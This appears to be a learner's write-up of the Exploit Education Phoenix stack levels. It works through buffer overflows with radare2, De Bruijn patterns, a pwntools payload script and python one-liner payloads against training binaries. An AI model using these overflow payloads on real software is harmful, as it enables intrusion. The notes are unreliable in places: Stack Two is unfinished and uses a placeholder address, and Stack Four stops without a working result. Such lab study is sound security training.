
Exploit Education > Phoenix > 

=== Stack Zero ===

Code Snippet:
locals.changeme = 0;
if (locals.changeme != 0) 
{
  puts("Well done, the 'changeme' variable has been changed!");
}

# r2 -d -A stack-zero
# s main; pdf 

Spammed letter "a" until "a"s overwrite variable. 

=== Stack One ===
Code Snippet:
if (locals.changeme == 0x496c5962)

Used ASCII code to convert hex (0x496c5962) to characters:  = "IlYb"
a*~64 + IlYb. Buffer overflow and overwrite variable with IlYb

Refined version 1.0:
# Using De Bruijn Sequences
$ ragg2 -P 100 -r
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x41574141, we want 0x496c5962

0x41574141 (Hexadecimal) == AWAA (ASCII)
Replace AWAA in De Bruijn sequence with "IlYb" (Need to reverse because Endianness)

user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one ***bYlI***
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value

Note:
Code Snippet:
# Buffer can only hold 64 characters so buffer overflow achieve using 65 characters. 
char buffer[64];

# dr rbp = 0x7fffffffe5d0
locals.changeme = 0;
mov dword [rbp - local_10h], 0
# 0x7fffffffe5d0 - 0x10 = 0x7fffffffe5c0
lea rax, qword [rbp - local_50h]
# 0x7fffffffe5d0 - 0x50 = 0x7fffffffe580

[0x0040066d]> px 100 @0x7fffffffe580
=========================================================================
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7fffffffe580  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0x7fffffffe590  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0x7fffffffe5a0  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
0x7fffffffe5b0  4141 4141 4141 4141 4141 4141 007f 0000  AAAAAAAAAAAA....
0x7fffffffe5c0  0000 0000 0000 0000 0000 0000 0000 0000  ................
=========================================================================

=== Stack Two ===

Code Snippet:
ptr = getenv("ExploitEducation");
if (ptr == NULL) 
{
  errx(1, "please set the ExploitEducation environment variable");
}
...
locals.changeme = 0;
strcpy(locals.buffer, ptr);
...
if (locals.changeme == 0x0d0a090a) 
{
  puts("Well done, you have successfully set changeme to the correct value");
}

1) Check where the environment variable (ptr) sits on the stack:
# s main;pdf
=========================================================================
0x004006d0      488945f8       mov qword [rbp - local_8h], rax
=========================================================================
2) Check where target local variable (locals.changeme) sits on the stack:
# mov dword [rbp - local_10h], 0 == locals.changeme = 0;
# lea rax, qword [rbp - local_50h] == locals.buffer

# Display memory address stored in the rbp register (Base Pointer Register)
$dr rbp
# Calculating memory address of where variable is located:
Memory Address = rbp - local_10h = 0x7fff1234 - 0x10 = 0x7fff1224

0x7fffffffe640

"Adjacent Neighbors"
Inspect memory content using the command: px 
"px @rsp" view address at the "Stack Pointer Register" (Top of stack)
3) Change environment variable and add target memory address to overwrite local variable:
# printenv ExploitEducation
# export ExploitEducation=NOT_NULL

===Stack Three===
# Objective: Redirect flow to reach the function below.
void complete_level()

# Need to modify "locals.fp" variable to memory address to function above.
locals.fp = NULL;
gets(locals.buffer);

Used De Bruijn Sequences and adjacent neighbors calculations to identify location/memory address to modify.
Confirm memory address content's overwritten to point to address found in afl.
# s main; pdf
# afl
# 0x0040069d    1 24           sym.complete_level

0x4141584141574141
x41x41x58x41x41x57x41x41 (Hexadecimal) to AAXAAWAA (ASCII)
AAXAAWAA -> AAWAAXAA
64 characters before AAWAAXAA
# afl
=========================================================================
0x0040069d    1 24           sym.complete_level
=========================================================================
Convert memory address to bytes representation.
p64(0x0040069d) -> b'\x9d\x06@\x00\x00\x00\x00\x00'
Sample input to enter into program's buffer: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x9d\x06@\x00\x00\x00\x00\x00'
# pxr @ rsp
=========================================================================
0x7fffffffe650  0x4141414141414141   AAAAAAAA ascii
0x7fffffffe658  0x4141414141414141   AAAAAAAA ascii
0x7fffffffe660  0x3936303034307830   0x040069 rip ascii
0x7fffffffe668  0x0000000000000064   d....... (.shstrtab) ascii
=========================================================================
ISSUE: Manually inputting string into radare2 causes interpretation of backlash x as string and not hex.
echo -e "\x9d\x06@\x00\x00\x00\x00\x00" > ASCII representation
echo -e "\x30\x78\x30\x34\x30\x30\x36\x39\x64" -> 0x040069d
0x40069d \x9d\x06\x40

./stack-three-script.py
=========================================================================
from pwn import *
payload = b''
payload += cyclic(64)
address = input("Address: ")
payload += p64(int(address, base=16))
print(payload)
=========================================================================

# sudo echo "0x40069d" | python3 general_tool.py | ./stack-three
# python -c 'print "A"*64 + "\x9d\x06\x40"' | ./stack-three

===Stack Four===
$ r2 -d -A ./stack-four
$ afl
=========================================================================
0x0040061d    1 24           sym.complete_level
=========================================================================
$ ragg2 -P 100 -r
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfA
$ user@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print "A"*64 + "\x1d\x06\x40\x00"' | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40068d

